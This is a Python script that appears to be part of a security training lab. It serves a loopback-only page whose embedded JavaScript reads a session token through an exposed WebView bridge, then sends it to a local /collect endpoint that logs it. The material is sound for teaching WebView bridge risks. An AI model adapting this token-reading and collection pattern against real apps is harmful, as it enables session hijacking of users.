"""A loopback-only page + collector for the synthetic SurfaceLab WebView demo."""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit
import argparse
import json

HTML = b'''<!doctype html><meta name="viewport" content="width=device-width">
<body style="background:#152133;color:#eef4ff;font:17px sans-serif;padding:24px">
<p style="color:#55e6bc">SURFACELAB / LOCAL TRAINING PAGE</p>
<h1>An untrusted page reached the session.</h1><pre id="result">Reading bridge...</pre>
<script>
try {
  const token = LabSession.readSession();
  document.getElementById('result').textContent = token;
  fetch('/collect?token=' + encodeURIComponent(token));
} catch (error) { document.getElementById('result').textContent = 'BLOCKED: ' + error; }
</script>'''

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlsplit(self.path)
        if parsed.path == '/collect':
            print(json.dumps({'lab': 'webview', 'received': parse_qs(parsed.query)}), flush=True)
            payload, content_type = b'collected synthetic evidence', 'text/plain'
        elif parsed.path == '/':
            payload, content_type = HTML, 'text/html; charset=utf-8'
        else:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Length', str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--port', type=int, default=8765)
    args = parser.parse_args()
    print(f'SurfaceLab collector: http://127.0.0.1:{args.port}', flush=True)
    HTTPServer(('127.0.0.1', args.port), Handler).serve_forever()
